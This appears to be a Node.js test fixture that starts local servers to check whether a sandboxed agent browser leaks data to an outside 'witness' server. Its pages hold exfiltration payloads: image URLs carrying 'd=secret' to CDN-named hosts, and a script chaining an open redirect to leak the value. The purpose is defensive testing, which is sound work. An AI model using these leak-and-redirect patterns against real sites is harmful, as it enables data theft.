// :5300 plays an agent page (agent port range); :8098 a non-agent local page; :8099 the web witness.
import http from "node:http";
import fs from "node:fs";
// On the host address the VM reaches (Tart default NAT gateway, else VM_HOST_IP).
const H = process.env.VM_HOST_IP ?? "192.168.64.1", log = process.argv[2];
const hit = (port, url) => fs.appendFileSync(log, JSON.stringify({ port, url, at: Date.now() }) + "\n");
const serve = (port, routes) => http.createServer((req, res) => {
  hit(port, req.url);
  const u = new URL(req.url, "http://x");
  if (u.pathname === "/r") return res.writeHead(302, { Location: u.searchParams.get("to") }).end();
  const body = routes[u.pathname];
  res.writeHead(body ? 200 : 404, { "Content-Type": "text/html" }).end(body ?? "");
}).listen(port, H);
serve(5300, {
  "/page": "<title>agent</title>",
  "/cdn": `<title>cdn</title><img src="/own.png"><img src="http://unpkg.com:8099/v/a6-clear?d=secret"><img src="http://cdn.jsdelivr.net:8099/v/a6-clear-2?d=secret">`,
});
serve(8098, { "/page": "<title>local</title>", "/via": `<title>via</title><script>location = "http://localhost:5300/r?to=" + encodeURIComponent("http://${H}:8099/v/via-leak?d=secret")</script>`, "/cdnctl": `<title>ctl</title><img src="http://unpkg.com:8099/v/a6-control">` });
serve(8099, { "/v/arrive": "<title>arrive</title>" });
console.log("ready");
